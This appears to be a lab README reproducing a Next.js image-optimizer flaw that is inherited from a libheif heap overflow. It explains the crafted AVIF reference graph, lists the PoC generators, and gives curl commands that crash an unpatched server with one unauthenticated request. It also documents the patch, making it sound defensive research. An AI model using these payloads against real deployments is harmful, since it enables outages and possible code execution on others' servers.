# Next.js Image Optimization RCE via AVIF (GHSA-2xp9-vwfh-vxw4)

## Introduction

Unauthenticated Remote Code Execution in the Next.js Image Optimization API
(`/_next/image`) when AVIF files are optimized.

The vulnerability is inherited from the underlying `libheif` library used by
`sharp` (Next.js image pipeline: `sharp -> libvips -> libheif`):

- Next.js advisory: [GHSA-2xp9-vwfh-vxw4](https://github.com/vercel/next.js/security/advisories/GHSA-2xp9-vwfh-vxw4)
  - Affected: `next >= 10.0.0 < 15.5.24`, `next < 16.3.3`
  - Patched: `15.5.24`, `16.3.3`
  - Fix: AVIF optimization disabled until a libheif fix propagates
- Root cause: [GHSA-g89c-p67h-r497](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)
  - Heap buffer overflow in `HeifPixelImage::scale_nearest_neighbor()`
  - Affected: `libheif <= 1.23.1` (vulnerable storage model since 1.22.0)
  - Patched: `1.23.2`
  - Credits: rootxharsh, KarimPwnz

## Vulnerability Chain

A crafted HEIF/AVIF file with 5 items builds a nested `iden`/`auxl` reference
graph that produces **two Alpha planes** (one 8-bit, one 10-bit) attached to
the same image:

```
item5 (hvc1/av01, 128x128, primary)
  └─ auxl alpha -> item3 (iden, ispe 64x64)
       ├─ dimg -> item1 (64x64, 8-bit)  ─ auxl alpha -> item2 (64x64, 8-bit)
       └─ auxl alpha -> item4 (64x64, 10-bit)
```

1. `transfer_channel_from_image_as()` accepts a duplicate Alpha channel
   (`// TODO: check that dst_channel does not exist yet`).
2. `find_storage_for_channel()` returns only the first Alpha plane, so the
   destination allocation in `scale_nearest_neighbor()` uses its 8-bit depth.
3. The scaler iterates **every** storage entry; the 10-bit Alpha takes the
   HDR branch and writes `uint16_t` samples through an 8-bit allocation.
4. `ImageItem_iden::check_decoded_image_size()` always returns `Error::Ok`,
   so the 64x64 alpha is scaled to the 128x128 primary: allocates 16,384
   bytes but writes 32,768 bytes (overflow of ~16 KB).

Since Next.js `imageOptimizer()` runs `sharp(buffer).rotate().resize(w)` on
any `image/avif` upload reachable via `/_next/image?url=...&w=...&q=...`,
an unauthenticated attacker triggers the overflow by pointing the endpoint
at a malicious AVIF. The researchers report RCE on multiple applications
using `heif_decode_image()`.

### Why the overflow needs `sharp >= 0.35.x`

| sharp | @img/sharp-libvips | libvips | libheif | vulnerable? |
|-------|--------------------|---------|---------|-------------|
| 0.34.3 | 1.2.0 | 8.17.1 | **1.20.1** | no (planes stored in `std::map`, duplicates collapse) |
| 0.35.0/1 | 1.3.0/1 | 8.18.3 | **1.23.0** | yes |
| 0.35.2/3 | 1.3.2 | 8.18.3 | **1.23.1** | yes |

`next@16.3.2` declares `sharp@^0.35.3`, so the default dependency resolution
bundles the vulnerable libheif 1.23.1.

### The Next.js fix (15.5.24 / 16.3.3)

Commit `409772ec80` (`[next/image]: disable avif image optimization`):

```ts
-const BYPASS_TYPES = [SVG, ICO, ICNS, BMP, JXL, HEIC]
+const BYPASS_TYPES = [SVG, ICO, ICNS, BMP, JXL, HEIC, AVIF]
```

plus, in `getSharp()`:

```ts
_sharp.block({ operation: ['VipsForeignLoad'] })
_sharp.unblock({ operation: ['VipsForeignLoadJpeg', 'VipsForeignLoadNsgif',
  'VipsForeignLoadPng', 'VipsForeignLoadSvg', 'VipsForeignLoadTiff',
  'VipsForeignLoadWebp'] })   // 'VipsForeignLoadHeif' removed
```

AVIF input is now served as-is (no decode) and any remaining vips foreign
load path that could decode AVIF is blocked at the sharp level.

## Environment

```
docker compose build
docker compose up -d vuln patched
```

| Service | Next.js | sharp/libheif | URL |
|---------|---------|---------------|-----|
| vuln    | 16.3.2  | 0.35.3 / 1.23.1 | http://localhost:13000 |
| patched | 16.3.3  | 0.35.3 / 1.23.1 | http://localhost:13001 |
| asan    | -       | libheif 1.23.1 (ASan) | CLI only |

App listens on custom port 4300 inside the containers (mapped to 13000/13001
on the host); host port 3000 is intentionally not used.

## Files

- `poc/gen_poc.py` — upstream advisory PoC generator (HEVC/hvc1 items),
  writes `poc.avif` (brand `avif`). Requires ffmpeg with libx265.
- `poc/gen_poc_av1.py` — AV1 (av01) variant for the Next.js path (sharp's
  bundled libheif has no HEVC decoder, only aom/dav1d). Writes
  `poc-av1.avif` (128px primary, ~16 KB overflow) and
  `poc-av1-512.avif` (512px primary, ~256 KB overflow). Requires ffmpeg
  with libaom-av1.
- `poc/benign.avif` — plain 64x64 AV1 still picture (control).

Regenerate the payloads:

```bash
docker run --rm -v "$PWD/poc:/work" -w /work python:3.12-slim bash -c \
  "apt-get update -qq && apt-get install -y -qq --no-install-recommends ffmpeg \
   && python3 gen_poc.py && python3 gen_poc_av1.py && python3 gen_poc_av1.py 512"
```

## Verification

### 1. Underlying libheif overflow (deterministic, ASan)

```bash
docker compose run --rm --no-deps asan --quiet /poc/poc.avif /tmp/out.y4m
```

Expected: AddressSanitizer `heap-buffer-overflow`, `WRITE of size 2`
at `... 0 bytes to the right of 16399-byte region`, in
`HeifPixelImage::scale_nearest_neighbor()`.

### 2. Unauthenticated crash of vulnerable next 16.3.2

```bash
curl -s -m 30 -o /dev/null -w "%{http_code}\n" \
  "http://localhost:13000/_next/image?url=/poc-av1.avif&w=128&q=75"
```

Expected: empty reply (`curl` exit 52), server logs

```
malloc(): invalid size (unsorted)
Aborted
```

The whole Next.js process dies — unauthenticated, single GET. The 512px
payload (`url=/poc-av1-512.avif&w=384&q=75`) corrupts ~256 KB.

Control (decode path is live): `GET /_next/image?url=/benign.avif&w=32&q=75`
returns a re-encoded 323-byte image (source is 309 bytes).

### 3. Patched next 16.3.3 serves the file untouched

```bash
curl -s -o /tmp/p.bin \
  "http://localhost:13001/_next/image?url=/poc-av1.avif&w=128&q=75"
cmp /tmp/p.bin app/public/poc-av1.avif && echo identical
```

Expected: `200`, `Content-Type: image/avif`, bytes identical to the source
(optimizer bypass, no decode).

## References

1. https://github.com/vercel/next.js/security/advisories/GHSA-2xp9-vwfh-vxw4
2. https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497
3. Next.js fix: `409772ec807def20132d251ad48fd8d8ad4c73c2` ([15.5.x] [next/image]: disable avif image optimization)
